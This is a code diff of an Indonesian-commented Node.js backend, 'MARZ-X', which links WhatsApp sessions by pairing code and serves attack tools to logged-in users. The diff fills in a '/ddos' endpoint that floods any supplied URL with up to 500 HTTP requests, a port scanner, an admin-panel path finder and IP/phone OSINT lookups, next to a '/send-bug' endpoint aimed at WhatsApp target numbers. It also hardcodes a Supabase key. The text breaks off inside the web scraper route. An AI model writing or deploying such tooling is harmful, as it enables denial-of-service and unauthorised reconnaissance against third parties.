@@ -1,12 +1,12 @@
 // ============================================================
-// MARZ-X BACKEND v3.2.0 – PAIRING STABIL + AUTO RETRY
+// MARZ-X BACKEND v3.2.1 – FULL LENGKAP + PAIRING STABIL
 // ============================================================
 if (process.env.NODE_ENV !== 'production') require('dotenv').config();
 const express = require('express');
 const app = express();
 
 // ============================================================
-// ROUTE UTAMA
+// ROUTE UTAMA (BIAR RAILWAY CEPAT RESPON)
 // ============================================================
 app.get('/', (req, res) => res.send('MARZ-X Backend Online'));
 app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));
@@ -37,7 +37,7 @@ const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs');
 
 // ============================================================
-// HARDCODE SUPABASE
+// HARDCODE SUPABASE (atau pake env kalo mau)
 // ============================================================
 const SUPABASE_URL = 'https://nxihknuzzmqbdcazikln.supabase.co';
 const SUPABASE_ANON_KEY = 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
@@ -87,17 +87,16 @@ app.post('/login', async (req, res) => {
 });
 
 // ============================================================
-// FUNGSI WHATSAPP SOCKET – VERSI STABIL
+// FUNGSI WHATSAPP SOCKET – VERSI STABIL DENGAN RETRY
 // ============================================================
 async function getUserSocket(username, phoneNumber) {
-  // 1. Hapus session lama
+  // Hapus session lama
   const authFolder = path.join(__dirname, `auth_${username}`);
   if (fs.existsSync(authFolder)) {
     fs.rmSync(authFolder, { recursive: true, force: true });
     console.log(`[AUTH] Session ${username} dihapus`);
   }
 
-  // 2. Buat socket baru
   const { state, saveCreds } = await useMultiFileAuthState(authFolder);
   const sock = makeWASocket({
     printQRInTerminal: false,
@@ -132,7 +131,7 @@ async function getUserSocket(username, phoneNumber) {
     }
   });
 
-  // 3. Tunggu sampai socket open
+  // Tunggu sampai socket open
   await new Promise((resolve) => {
     const checkReady = () => {
       if (isReady) resolve();
@@ -141,7 +140,7 @@ async function getUserSocket(username, phoneNumber) {
     checkReady();
   });
 
-  // 4. Generate pairing code dengan retry 3×
+  // Generate pairing code dengan retry 3×
   let retries = 3;
   while (retries > 0 && !pairingCode) {
     try {
@@ -159,7 +158,6 @@ async function getUserSocket(username, phoneNumber) {
     throw new Error('Gagal generate pairing code setelah 3 kali percobaan');
   }
 
-  // 5. Simpan session
   sessions[username] = {
     sock,
     isReady,
@@ -169,7 +167,6 @@ async function getUserSocket(username, phoneNumber) {
     intervalId: null
   };
 
-  // 6. Interval update status
   const intervalId = setInterval(() => {
     if (sessions[username]) {
       sessions[username].isReady = isReady;
@@ -185,7 +182,7 @@ async function getUserSocket(username, phoneNumber) {
 }
 
 // ============================================================
-// UPDATE STATS (SAMA SEPERTI SEBELUMNYA)
+// UPDATE STATS & CHECK TOOL ACCESS
 // ============================================================
 async function updateUserStats(username, type, target, detail) {
   if (!username) return;
@@ -214,42 +211,25 @@ async function checkToolAccess(username, toolName) {
 }
 
 // ============================================================
-// ENDPOINT PAIRING – DIPERBAIKI
+// PAIRING ENDPOINT
 // ============================================================
 app.post('/pairing-code', verifyToken, async (req, res) => {
   const { phoneNumber } = req.body;
   const username = req.user.username;
-
   if (!phoneNumber) return res.status(400).json({ error: 'phoneNumber wajib' });
-
   const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
   if (!cleanNumber.startsWith('62') && !cleanNumber.startsWith('8')) {
     return res.status(400).json({ error: 'Nomor harus diawali 62 atau 8' });
   }
   const finalNumber = cleanNumber.startsWith('62') ? cleanNumber : '62' + cleanNumber;
-
-  // Hapus session lama jika ada
-  if (sessions[username]) {
-    delete sessions[username];
-  }
-
+  if (sessions[username]) delete sessions[username];
   try {
     await getUserSocket(username, finalNumber);
     const session = sessions[username];
     if (session && session.pairingCode) {
-      return res.json({
-        status: 'disconnected',
-        message: 'Masukkan kode 8 digit ke WhatsApp > Perangkat Tertaut > Tautkan Perangkat dengan Nomor Telepon',
-        code: session.pairingCode,
-        expiresIn: '60 detik'
-      });
+      return res.json({ status: 'disconnected', message: 'Masukkan kode 8 digit ke WhatsApp > Perangkat Tertaut > Tautkan Perangkat dengan Nomor Telepon', code: session.pairingCode, expiresIn: '60 detik' });
     } else if (session && session.qrString) {
-      return res.json({
-        status: 'disconnected',
-        message: 'Gagal generate kode pairing. Coba scan QR Code.',
-        code: null,
-        qrAvailable: true
-      });
+      return res.json({ status: 'disconnected', message: 'Gagal generate kode pairing. Coba scan QR Code.', code: null, qrAvailable: true });
     } else {
       return res.status(500).json({ error: 'Gagal mendapatkan kode pairing. Pastikan nomor benar.' });
     }
@@ -260,7 +240,7 @@ app.post('/pairing-code', verifyToken, async (req, res) => {
 });
 
 // ============================================================
-// ENDPOINT QR
+// QR ENDPOINT
 // ============================================================
 app.get('/qr/:username', verifyToken, async (req, res) => {
   const { username } = req.params;
@@ -279,7 +259,7 @@ app.get('/qr/:username', verifyToken, async (req, res) => {
 });
 
 // ============================================================
-// ENDPOINT STATUS
+// STATUS ENDPOINTS
 // ============================================================
 app.get('/status', (req, res) => {
   let anyReady = false;
@@ -295,7 +275,7 @@ app.get('/status/:username', verifyToken, (req, res) => {
 });
 
 // ============================================================
-// ENDPOINT SEND BUG
+// SEND BUG
 // ============================================================
 app.post('/send-bug', verifyToken, async (req, res) => {
   const { targetNumber, effect } = req.body;
@@ -328,28 +308,121 @@ app.post('/send-bug', verifyToken, async (req, res) => {
 });
 
 // ============================================================
-// ENDPOINT TOOLS (DDOS, PORTSCAN, OSINT, DLL) – SAMA SEPERTI SEBELUMNYA
+// TOOLS ENDPOINTS (LENGKAP)
 // ============================================================
-// (Saya singkat karena sudah ada, tidak diubah)
 
-app.post('/ddos', verifyToken, async (req, res) => { /* ... */ });
-app.post('/tools/portscan', verifyToken, async (req, res) => { /* ... */ });
-app.post('/tools/reverseip', verifyToken, async (req, res) => { /* ... */ });
-app.post('/tools/osint', verifyToken, async (req, res) => { /* ... */ });
-app.post('/tools/adminfinder', verifyToken, async (req, res) => { /* ... */ });
-app.post('/tools/webscraper', verifyToken, async (req, res) => { /* ... */ });
-app.get('/tools/global-stats', verifyToken, async (req, res) => { /* ... */ });
-
-// ============================================================
-// ENDPOINT ADMIN (jika ada)
-// ============================================================
-// ... (tidak diubah)
-
-// ============================================================
-// JALANKAN
-// ============================================================
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`[SERVER] MARZ-X Backend running on port ${PORT}`);
-  console.log(`[NODE] ${process.version}`);
-  console.log(`[AUTH] JWT + bcryptjs active`);
+// DDOS
+app.post('/ddos', verifyToken, async (req, res) => {
+  const { url, count = 100, method = 'GET' } = req.body;
+  const username = req.user.username;
+  if (!url) return res.status(400).json({ error: 'URL target wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'ddos');
+  if (!hasAccess) return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
+  try {
+    const promises = [];
+    let success = 0, failed = 0;
+    const maxReq = Math.min(count, 500);
+    for (let i = 0; i < maxReq; i++) {
+      const p = axios({ method, url, timeout: 5000, validateStatus: () => true }).then(() => success++).catch(() => failed++);
+      promises.push(p);
+      if (i % 50 === 0) await delay(10);
+    }
+    await Promise.all(promises);
+    await updateUserStats(username, 'TOOL', url, `DDoS HTTP (${method}) - ${success} sukses, ${failed} gagal`);
+    res.json({ success: true, target: url, total: maxReq, success, failed, message: `✅ ${success} berhasil, ${failed} gagal` });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
 });
+
+// Port Scanner
+app.post('/tools/portscan', verifyToken, async (req, res) => {
+  const { host, ports } = req.body;
+  const username = req.user.username;
+  if (!host) return res.status(400).json({ error: 'Host wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'portscan');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak' });
+  const portList = ports ? ports.split(',').map(p => parseInt(p.trim())) : [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017];
+  const results = [];
+  for (const port of portList) {
+    const start = Date.now();
+    const result = await new Promise((resolve) => {
+      const socket = new net.Socket();
+      const timer = setTimeout(() => { socket.destroy(); resolve({ port, status: 'closed', time: Date.now()-start }); }, 2000);
+      socket.on('connect', () => { clearTimeout(timer); socket.destroy(); resolve({ port, status: 'open', time: Date.now()-start }); });
+      socket.on('error', () => { clearTimeout(timer); resolve({ port, status: 'filtered', time: Date.now()-start }); });
+      socket.connect(port, host);
+    });
+    results.push(result);
+  }
+  const openPorts = results.filter(r => r.status === 'open');
+  await updateUserStats(username, 'TOOL', host, `Port Scan: ${openPorts.length} open`);
+  res.json({ success: true, host, results, openPorts: openPorts.map(r=>r.port), message: `✅ ${openPorts.length} port terbuka` });
+});
+
+// Reverse IP
+app.post('/tools/reverseip', verifyToken, async (req, res) => {
+  const { ip } = req.body;
+  const username = req.user.username;
+  if (!ip) return res.status(400).json({ error: 'IP wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'reverseip');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak' });
+  try {
+    const domain = await new Promise((resolve, reject) => dns.reverse(ip, (err, hostnames) => err ? reject(err) : resolve(hostnames)));
+    await updateUserStats(username, 'TOOL', ip, `Reverse IP: ${domain.join(', ')}`);
+    res.json({ success: true, ip, domain, message: `✅ Domain: ${domain.join(', ')}` });
+  } catch (error) { res.status(500).json({ error: error.message }); }
+});
+
+// OSINT Lookup
+app.post('/tools/osint', verifyToken, async (req, res) => {
+  const { target } = req.body;
+  const username = req.user.username;
+  if (!target) return res.status(400).json({ error: 'Target wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'osint');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak' });
+  const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(target);
+  const isPhone = /^(\+?\d{10,15})$/.test(target);
+  let result = {};
+  if (isIP) {
+    const ipRes = await axios.get(`https://ipinfo.io/${target}/json`);
+    result = { type: 'IP', ip: target, data: ipRes.data };
+  } else if (isPhone) {
+    result = { type: 'Phone', number: target, data: { country: 'Indonesia (estimasi)', carrier: 'Telkomsel / Indosat / XL (estimasi)' }, note: 'Perkiraan, gunakan API berbayar.' };
+  } else {
+    return res.status(400).json({ error: 'Target harus IP atau nomor HP' });
+  }
+  await updateUserStats(username, 'TOOL', target, `OSINT Lookup: ${JSON.stringify(result)}`);
+  res.json({ success: true, target, result });
+});
+
+// Admin Finder
+app.post('/tools/adminfinder', verifyToken, async (req, res) => {
+  const { url } = req.body;
+  const username = req.user.username;
+  if (!url) return res.status(400).json({ error: 'URL wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'adminfinder');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak' });
+  const adminPaths = ['admin','administrator','wp-admin','login','admin/login','admin.php','dashboard','cp','cpanel','admin_area','panel','backend','auth','signin','log-in'];
+  const found = [];
+  const baseUrl = url.endsWith('/') ? url.slice(0,-1) : url;
+  for (const path of adminPaths) {
+    try {
+      const testUrl = `${baseUrl}/${path}`;
+      const response = await axios.get(testUrl, { timeout: 3000, validateStatus: () => true });
+      if (response.status === 200 || response.status === 401 || response.status === 403) {
+        found.push({ path, url: testUrl, status: response.status });
+      }
+    } catch(e) {}
+  }
+  await updateUserStats(username, 'TOOL', url, `Admin Finder: ${found.length} ditemukan`);
+  res.json({ success: true, url: baseUrl, found, total: found.length });
+});
+
+// Web Scraper
+app.post('/tools/webscraper', verifyToken, async (req, res) => {
+  const { url } = req.body;
+  const username = req.user.username;
+  if (!url) return res.status(400).json({ error: 'URL wajib diisi' });
+  const hasAccess = await checkToolAccess(username, 'webscraper');
+  if (!hasAccess) return res.status(403).json({ error: 'Akses ditolak'
